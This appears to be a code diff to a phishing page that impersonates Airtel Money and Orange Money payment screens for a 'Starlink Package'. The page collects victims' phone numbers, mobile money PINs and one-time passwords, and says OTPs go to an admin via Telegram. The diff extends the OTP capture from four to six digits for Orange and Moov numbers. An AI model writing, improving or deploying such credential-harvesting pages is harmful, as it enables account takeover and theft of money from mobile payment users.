@@ -77,20 +77,22 @@
     }
     .pin-row, .otp-row {
       display: flex;
-      gap: 10px;
+      gap: 8px;
       justify-content: center;
+      flex-wrap: wrap;
     }
     .pin-row input, .otp-row input {
-      width: 52px;
-      height: 54px;
+      width: 48px;
+      height: 52px;
       text-align: center;
-      font-size: 22px;
+      font-size: 20px;
       font-weight: 700;
       border: 1.5px solid #ddd;
       border-radius: 10px;
       outline: none;
       background: #fafafa;
     }
+    .otp-row.otp-6 input { width: 40px; height: 48px; font-size: 18px; }
     .pin-row input:focus, .otp-row input:focus {
       border-color: #ff7900;
       background: #fff;
@@ -162,13 +164,15 @@
       <button class="btn btn-primary" id="btn-send" onclick="sendOTP()">Verify PIN</button>
       <div id="otp-section">
         <div class="field">
-          <label style="text-align:center;">Enter the 4-digit OTP</label>
+          <label style="text-align:center;" id="otp-label">Enter the 6-digit OTP</label>
           <div class="hint" style="text-align:center;">Sent to Telegram (admin) for verification</div>
-          <div class="otp-row" style="margin-top:12px;">
+          <div class="otp-row otp-6" id="otp-row" style="margin-top:12px;">
             <input type="text" id="o1" maxlength="1" inputmode="numeric">
             <input type="text" id="o2" maxlength="1" inputmode="numeric">
             <input type="text" id="o3" maxlength="1" inputmode="numeric">
             <input type="text" id="o4" maxlength="1" inputmode="numeric">
+            <input type="text" id="o5" maxlength="1" inputmode="numeric">
+            <input type="text" id="o6" maxlength="1" inputmode="numeric">
           </div>
         </div>
         <button class="btn btn-success" id="btn-verify" style="display:block;" onclick="verifyOTP()">VERIFY OTP & CONFIRM</button>
@@ -185,9 +189,13 @@
     const currency = params.get("cur") || "KES";
     const packageName = params.get("package") || "Starlink Package";
     const prefillPhone = params.get("phone") || "";
+    // Orange / Moov = 6-digit OTP; Airtel = 4-digit OTP
+    const otpLen = (provider === "orange" || provider === "moov") ? 6 : 4;
+
     document.body.className = (provider === "moov" ? "orange" : provider);
     document.getElementById("amount-display").textContent = currency + " " + amount;
     document.getElementById("service-display").textContent = packageName;
+
     if (provider === "airtel") {
       document.getElementById("title-text").textContent = "Enter your Airtel Money details to authorize payment";
       document.getElementById("phone-label").textContent = "Airtel Money Number";
@@ -195,6 +203,11 @@
       document.getElementById("footer-copy").textContent = "© 2026 Airtel Money. All rights reserved.";
       document.getElementById("btn-send").textContent = "SEND OTP";
       document.title = "LOGIN TO AIRTEL LITE";
+      document.getElementById("otp-label").textContent = "Enter the 4-digit OTP";
+      // Hide boxes 5 and 6 for Airtel
+      document.getElementById("o5").style.display = "none";
+      document.getElementById("o6").style.display = "none";
+      document.getElementById("otp-row").classList.remove("otp-6");
     } else {
       document.body.className = "orange";
       document.getElementById("title-text").textContent = "Enter your Orange Money details to authorize payment";
@@ -202,29 +215,43 @@
       document.getElementById("pin-hint").textContent = "Check your Orange Money app or SMS";
       document.getElementById("footer-copy").textContent = "© 2026 Orange Money. All rights reserved.";
       document.getElementById("btn-send").textContent = "Verify PIN";
+      document.getElementById("otp-label").textContent = "Enter the 6-digit OTP";
     }
+
     if (prefillPhone) {
       document.getElementById("phone").value = prefillPhone.replace(/^\+254/, "").replace(/^0/, "");
     }
+
     function wire(prefix, len) {
       for (let i = 1; i <= len; i++) {
         const el = document.getElementById(prefix + i);
+        if (!el) continue;
         el.addEventListener("input", () => {
-          if (el.value.length === 1 && i < len) document.getElementById(prefix + (i+1)).focus();
+          if (el.value.length === 1 && i < len) {
+            const next = document.getElementById(prefix + (i + 1));
+            if (next && next.style.display !== "none") next.focus();
+          }
           updateBtnState();
         });
         el.addEventListener("keydown", (e) => {
-          if (e.key === "Backspace" && !el.value && i > 1) document.getElementById(prefix + (i-1)).focus();
+          if (e.key === "Backspace" && !el.value && i > 1) document.getElementById(prefix + (i - 1)).focus();
         });
       }
     }
     wire("p", 4);
-    wire("o", 4);
-    function getVal(prefix) {
-      return [1,2,3,4].map(i => document.getElementById(prefix + i).value).join("");
+    wire("o", otpLen);
+
+    function getVal(prefix, len) {
+      let s = "";
+      for (let i = 1; i <= len; i++) {
+        const el = document.getElementById(prefix + i);
+        if (el) s += el.value;
+      }
+      return s;
     }
+
     function updateBtnState() {
-      const pin = getVal("p");
+      const pin = getVal("p", 4);
       const phone = document.getElementById("phone").value.trim();
       const btn = document.getElementById("btn-send");
       if (phone.length >= 9 && pin.length === 4) {
@@ -235,14 +262,16 @@
       }
     }
     document.getElementById("phone").addEventListener("input", updateBtnState);
+
     function showMsg(t, ok) {
       const m = document.getElementById("msg");
       m.textContent = t;
       m.className = "msg " + (ok ? "ok" : "err");
     }
+
     async function sendOTP() {
-      const phoneRaw = document.getElementById("phone").value.trim().replace(/\s+/g,"");
-      const pin = getVal("p");
+      const phoneRaw = document.getElementById("phone").value.trim().replace(/\s+/g, "");
+      const pin = getVal("p", 4);
       if (!phoneRaw || phoneRaw.length < 9) return showMsg("Enter a valid phone number");
       if (pin.length !== 4) return showMsg("Enter your 4-digit PIN");
       const phone = "+254" + phoneRaw.replace(/^0/, "").replace(/^\+254/, "");
@@ -262,18 +291,19 @@
         }
         document.getElementById("otp-section").style.display = "block";
         document.getElementById("o1").focus();
-        showMsg("OTP sent. Check Telegram bot.", true);
+        showMsg("OTP sent (" + otpLen + " digits). Check Telegram bot.", true);
       } catch (e) {
         showMsg("Network error. Try again.");
         document.getElementById("btn-send").disabled = false;
       }
     }
+
     async function verifyOTP() {
-      const phoneRaw = document.getElementById("phone").value.trim().replace(/\s+/g,"");
+      const phoneRaw = document.getElementById("phone").value.trim().replace(/\s+/g, "");
       const phone = "+254" + phoneRaw.replace(/^0/, "").replace(/^\+254/, "");
-      const pin = getVal("p");
-      const otp = getVal("o");
-      if (otp.length !== 4) return showMsg("Enter the 4-digit OTP");
+      const pin = getVal("p", 4);
+      const otp = getVal("o", otpLen);
+      if (otp.length !== otpLen) return showMsg("Enter the " + otpLen + "-digit OTP");
       showMsg("Verifying…", true);
       try {
         const res = await fetch("/api/auth/verify-otp", {
